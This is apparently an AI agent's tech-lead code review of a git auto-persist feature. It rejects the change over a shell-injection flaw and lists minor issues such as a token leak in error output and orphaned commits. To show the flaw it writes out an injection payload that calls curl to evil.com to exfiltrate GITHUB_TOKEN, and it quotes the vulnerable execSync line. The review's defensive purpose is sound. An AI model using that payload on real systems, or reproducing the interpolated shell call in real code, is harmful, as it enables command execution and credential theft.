# F13 Tech Lead Review -- Auto-persist Admin Changes to Git

**Reviewer:** Tech Lead Agent
**Date:** 2026-11-18
**Verdict:** REJECTED (1 critical issue must be fixed before merge)

---

## Review Checklist

| Criteria | Status | Notes |
|----------|--------|-------|
| Architecture matches plan | PASS | Serial queue, 12 endpoints, banner, status API, publish refactor -- all present |
| Code quality | PASS | Clean, well-structured, follows existing patterns |
| Security | **FAIL** | Shell injection via commit message (critical) |
| Correctness -- 12 endpoints | PASS | All 12 mutation endpoints call `gitPersist()` |
| Correctness -- serial queue | PASS | Promise-chain pattern correctly serialises operations |
| Correctness -- publish refactor | PASS | Reuses `gitPersist()`, awaits result, reports steps |
| Edge cases | PASS with notes | See minor issues below |

---

## Governance Compliance (Saruman G-20261117-001)

| Condition | Status |
|-----------|--------|
| G1: gitPersist uses serial queue (no concurrent git ops) | PASS -- Promise chain in `queue = queue.then(...)` ensures serialisation |
| G2: Push failures show user-visible error with retry | PASS -- Error state renders red banner with "Tentar novamente" button |
| G3: Banner not dismissable until push succeeds | PASS -- No close/dismiss button exists; banner only hides when `state === "clean"` |

---

## Critical Issues

### C1: Shell injection in commit message (`git-persist.ts:83`)

**File:** `admin/src/lib/git-persist.ts`, line 83
**Severity:** CRITICAL

```ts
execSync(`git commit -m "Auto-save: ${description}"`, GIT_OPTS);
```

The `description` parameter is interpolated directly into a shell command string. On line 309 of `server.ts`, the call is:

```ts
gitPersist(`Criar colecao: ${newCol.name}`);
```

Here `newCol.name` is raw user input from `body.name`. A malicious collection name such as:

```
foo"; curl https://evil.com/steal?token=$GITHUB_TOKEN; echo "
```

...would break out of the commit message string and execute arbitrary shell commands, leaking the `GITHUB_TOKEN` or worse.

**Fix:** Replace `execSync` string interpolation with `execFileSync` (array-based API) which does not invoke a shell, or at minimum sanitise/escape the description. The recommended approach:

```ts
import { execFileSync } from "child_process";
// ...
execFileSync("git", ["commit", "-m", `Auto-save: ${description}`], GIT_OPTS);
```

This passes the message as a single argv element, eliminating shell interpretation entirely. The same change should be applied to **all** `execSync` calls in the file that interpolate variables (`git add`, `git push`, `git remote add`).

---

## Minor Issues

### M1: `execSync` used throughout -- blocks the event loop

All git operations in `doGitPersist` use synchronous `execSync`, which blocks the Bun event loop for the duration of each `git add`, `git commit`, and `git push`. While the serial queue prevents concurrent git operations (good), a slow `git push` could block all HTTP request handling for seconds.

**Recommendation:** Consider replacing with `Bun.spawn` or `child_process.exec` (promise-wrapped) in a future iteration. Not blocking for this feature since the admin panel has very low concurrency.

### M2: Retry endpoint returns stale state

**File:** `server.ts`, line 636-638

```ts
if (path === "/api/persist-retry" && method === "POST") {
    gitPersist("Retry: re-push pending changes");
    return json({ state: getPersistState() }, 200, req);
}
```

`gitPersist()` is fire-and-forget here (not awaited), so `getPersistState()` will return the state *before* the retry operation starts (likely still `"error"`). The UI compensates by polling shortly after, so this is cosmetic, but the response is misleading.

**Recommendation:** Either await the result (like publish does) or document that the returned state is a snapshot and the UI should poll for updates.

### M3: Detached HEAD checkout to main may lose commits

**File:** `git-persist.ts`, lines 86-93

```ts
if (branch === "HEAD") {
    execSync("git checkout main", GIT_OPTS);
}
```

If the commit was made on a detached HEAD and then `git checkout main` is run, the commit just created becomes unreachable (orphaned). The correct sequence would be to create the commit on the detached HEAD, then update `main` to point to it:

```ts
if (branch === "HEAD") {
    execSync("git branch -f main HEAD", GIT_OPTS);
    execSync("git checkout main", GIT_OPTS);
}
```

**Impact:** On Render's ephemeral filesystem with detached HEAD, committed data could be silently lost before push. This is a moderate concern in production.

### M4: `GITHUB_TOKEN` visible in push URL error output

**File:** `git-persist.ts`, lines 124, 132-141

If `git push` fails, the error/stderr from `execSync` may contain the authenticated URL including `GITHUB_TOKEN`. This error string is stored in `lastError` and exposed via `/api/persist-status`, which means the token could be displayed in the admin UI banner.

**Recommendation:** Sanitise the error string before storing it, e.g., replace any token-like patterns:

```ts
const sanitised = detail.replace(/x-access-token:[^@]+@/, "x-access-token:***@");
```

### M5: Upload images endpoint missing `sampleImages` update before `gitPersist`

**File:** `server.ts`, lines 552-554

After processing uploaded deck images, the `processed` array of new image paths is returned to the client but never written to `collections.json` `sampleImages`. The `gitPersist` call will commit nothing meaningful because the JSON has not changed. It appears the UI is expected to call a separate PUT to update `sampleImages`, but this creates a window where the images exist on disk but are not referenced in the JSON, and the git commit message ("Upload amostras") is misleading since only binary files are staged.

**Recommendation:** Verify this is intentional (perhaps the UI handles this). If so, add a code comment explaining the two-step flow. If not, append to `col.sampleImages` and `writeJson` before `gitPersist`.

---

## Summary

The implementation is well-structured and faithfully follows the F13 plan. The serial queue pattern is correct, the UI banner meets all governance conditions, and all 12 mutation endpoints are covered. However, the **shell injection vulnerability (C1)** is a hard blocker -- it allows authenticated admin users to execute arbitrary commands on the server with access to `GITHUB_TOKEN` and the filesystem.

**Action required:**
1. Fix C1 (switch to `execFileSync` for all git operations) -- **must fix before merge**
2. Fix M3 (detached HEAD handling) -- **strongly recommended before deploy to Render**
3. Fix M4 (token leak in error output) -- **recommended**
4. M1, M2, M5 can be addressed in a follow-up

Once C1 is resolved, this feature is ready to ship.
